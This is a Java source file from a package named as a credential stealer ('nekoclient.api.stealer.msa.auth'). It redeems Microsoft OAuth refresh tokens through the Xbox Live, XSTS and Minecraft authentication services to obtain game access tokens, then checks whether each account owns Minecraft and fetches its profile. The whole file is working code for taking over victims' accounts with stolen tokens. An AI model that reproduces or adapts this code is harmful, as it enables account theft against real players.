package dev.neko.nekoclient.api.stealer.msa.auth;

import com.eclipsesource.json.Json;
import com.eclipsesource.json.JsonValue;
import dev.neko.nekoclient.api.stealer.msa.auth.credentials.MicrosoftCredentials;
import dev.neko.nekoclient.api.stealer.msa.auth.credentials.MinecraftCredentials;
import dev.neko.nekoclient.api.stealer.msa.auth.credentials.XSTSCredentials;
import dev.neko.nekoclient.api.stealer.msa.auth.credentials.XboxLiveCredentials;
import dev.neko.nekoclient.utils.FormUtil;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.stream.Collectors;
import javax.net.ssl.HttpsURLConnection;

public class MicrosoftAuth {
   public static MicrosoftCredentials refreshToken(MicrosoftCredentials microsoftCredentials) throws IOException {
      return refreshToken(microsoftCredentials.getRefreshToken(), microsoftCredentials.getClientType());
   }

   public static MicrosoftCredentials refreshToken(String refreshToken, ClientType clientType) throws IOException {
      Map<String, String> params = new HashMap<>();
      params.put("client_id", clientType.getClientId());
      params.put("redirect_uri", "https://login.live.com/oauth20_desktop.srf");
      if (Objects.nonNull(clientType.getScope())) {
         params.put("scope", clientType.getScope());
      }

      params.put("response_type", "token");
      params.put("refresh_token", refreshToken);
      params.put("grant_type", "refresh_token");
      HttpsURLConnection connection = (HttpsURLConnection)new URL("https://login.live.com/oauth20_token.srf").openConnection();
      connection.setDoOutput(true);
      connection.setDoInput(true);
      connection.setRequestMethod("POST");
      connection.setRequestProperty("Accept", "application/json");
      connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
      connection.getOutputStream().write(FormUtil.encodeToForm(params).getBytes());
      return MicrosoftCredentials.parseResponse(Json.parse(new InputStreamReader(connection.getInputStream())).asObject(), clientType);
   }

   public static XboxLiveCredentials retrieveXboxLiveCredentials(MicrosoftCredentials microsoftCredentials) throws IOException {
      return retrieveXboxLiveCredentials(microsoftCredentials.getAccessToken(), microsoftCredentials.getClientType().getTokenType());
   }

   public static XboxLiveCredentials retrieveXboxLiveCredentials(String microsoftAccessToken, String tokenType) throws IOException {
      HttpsURLConnection connection = (HttpsURLConnection)new URL("https://user.auth.xboxlive.com/user/authenticate").openConnection();
      connection.setDoOutput(true);
      connection.setDoInput(true);
      connection.setRequestMethod("POST");
      connection.setRequestProperty("Content-Type", "application/json");
      connection.setRequestProperty("Accept", "application/json");
      connection.getOutputStream()
         .write(
            Json.object()
               .add(
                  "Properties",
                  Json.object()
                     .add("AuthMethod", "RPS")
                     .add("SiteName", "user.auth.xboxlive.com")
                     .add("RpsTicket", String.format("%s=%s", tokenType, microsoftAccessToken))
               )
               .add("RelyingParty", "http://auth.xboxlive.com")
               .add("TokenType", "JWT")
               .toString()
               .getBytes()
         );
      return XboxLiveCredentials.parseResponse(Json.parse(new InputStreamReader(connection.getInputStream())).asObject());
   }

   public static XSTSCredentials retrieveXSTSCredentials(XboxLiveCredentials xboxLiveCredentials) throws IOException {
      return retrieveXSTSCredentials(xboxLiveCredentials.getToken());
   }

   public static XSTSCredentials retrieveXSTSCredentials(String xboxLiveToken) throws IOException {
      HttpsURLConnection connection = (HttpsURLConnection)new URL("https://xsts.auth.xboxlive.com/xsts/authorize").openConnection();
      connection.setDoOutput(true);
      connection.setDoInput(true);
      connection.setRequestMethod("POST");
      connection.setRequestProperty("Content-Type", "application/json");
      connection.setRequestProperty("Accept", "application/json");
      connection.getOutputStream()
         .write(
            Json.object()
               .add("Properties", Json.object().add("SandboxId", "RETAIL").add("UserTokens", Json.array(xboxLiveToken)))
               .add("RelyingParty", "rp://api.minecraftservices.com/")
               .add("TokenType", "JWT")
               .toString()
               .getBytes()
         );
      return XSTSCredentials.parseResponse(Json.parse(new InputStreamReader(connection.getInputStream())).asObject());
   }

   public static MinecraftCredentials retrieveMinecraftCredentials(XSTSCredentials xstsCredentials) throws IOException {
      HttpsURLConnection connection = (HttpsURLConnection)new URL("https://api.minecraftservices.com/authentication/login_with_xbox").openConnection();
      connection.setDoOutput(true);
      connection.setDoInput(true);
      connection.setRequestMethod("POST");
      connection.setRequestProperty("Content-Type", "application/json");
      connection.setRequestProperty("Accept", "application/json");
      connection.getOutputStream()
         .write(
            Json.object()
               .add("identityToken", String.format("XBL3.0 x=%s;%s", xstsCredentials.getUserHash(), xstsCredentials.getToken()))
               .toString()
               .getBytes()
         );
      return MinecraftCredentials.parseResponse(Json.parse(new InputStreamReader(connection.getInputStream())).asObject());
   }

   public static boolean hasMinecraft(MinecraftCredentials minecraftCredentials) throws IOException {
      return retrieveMinecraftStore(minecraftCredentials).contains("game_minecraft");
   }

   public static boolean hasMinecraft(String minecraftAccessToken) throws IOException {
      return retrieveMinecraftStore(minecraftAccessToken).contains("game_minecraft");
   }

   public static List<String> retrieveMinecraftStore(MinecraftCredentials minecraftCredentials) throws IOException {
      return retrieveMinecraftStore(minecraftCredentials.getAccessToken());
   }

   public static List<String> retrieveMinecraftStore(String minecraftAccessToken) throws IOException {
      HttpsURLConnection connection = (HttpsURLConnection)new URL("https://api.minecraftservices.com/entitlements/mcstore").openConnection();
      connection.setDoInput(true);
      connection.setRequestMethod("GET");
      connection.setRequestProperty("Content-Type", "application/json");
      connection.setRequestProperty("Accept", "application/json");
      connection.setRequestProperty("Authorization", String.format("Bearer %s", minecraftAccessToken));
      return Json.parse(new InputStreamReader(connection.getInputStream()))
         .asObject()
         .get("items")
         .asArray()
         .values()
         .stream()
         .map(JsonValue::asObject)
         .map(object -> object.get("name"))
         .map(JsonValue::asString)
         .collect(Collectors.toList());
   }

   public static MinecraftProfile retrieveMinecraftProfile(MinecraftCredentials minecraftCredentials) throws IOException {
      return retrieveMinecraftProfile(minecraftCredentials.getAccessToken());
   }

   public static MinecraftProfile retrieveMinecraftProfile(String minecraftAccessToken) throws IOException {
      HttpsURLConnection connection = (HttpsURLConnection)new URL("https://api.minecraftservices.com/minecraft/profile").openConnection();
      connection.setDoInput(true);
      connection.setRequestMethod("GET");
      connection.setRequestProperty("Content-Type", "application/json");
      connection.setRequestProperty("Accept", "application/json");
      connection.setRequestProperty("Authorization", String.format("Bearer %s", minecraftAccessToken));
      return MinecraftProfile.parseResponse(Json.parse(new InputStreamReader(connection.getInputStream())).asObject());
   }
}
